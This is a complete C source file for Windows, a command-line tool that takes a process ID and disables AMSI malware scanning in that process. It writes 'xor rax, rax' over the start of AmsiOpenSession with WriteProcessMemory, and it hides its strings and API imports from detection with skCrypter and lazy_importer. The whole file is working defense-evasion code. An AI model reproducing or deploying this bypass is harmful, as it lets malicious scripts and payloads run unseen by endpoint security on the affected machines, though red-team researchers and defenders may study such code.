#include <windows.h>
#include <stdio.h>
#include "lib/skCrypter.h"
#include "lib/lazy_importer.hpp"


void patch(int pid) {
	HANDLE hProc = NULL;
	SIZE_T bytesWritten;

	hProc = LI_FN(OpenProcess)(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)pid);
	PVOID amsiAddr = (void *)LI_FN(GetProcAddress)(LI_FN(LoadLibraryA)(skCrypt("amsi.dll")), skCrypt("AmsiOpenSession"));
	unsigned char nop[] = { 0x48, 0x31, 0xC0 }; // xor rax, rax
	
	BOOL success = LI_FN(WriteProcessMemory)(hProc, amsiAddr, (PVOID)nop, sizeof(nop), &bytesWritten);
	CloseHandle(hProc);
	if (success) {
		printf(skCrypt("[+] Success! Patched process with PID %d\n"), pid);
	}
	else {
		printf(skCrypt("[-] Fail :( - Patching process with PID %d failed\n"), pid);
	}
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		printf("Usage: %s <pid>\n", argv[0]);
		return -1;
	}
    DWORD pid = strtol(argv[1], NULL, 10);
	printf(skCrypt("Attempting to patch AMSI in remote process with PID: %d\n"), pid);

	patch(pid);
}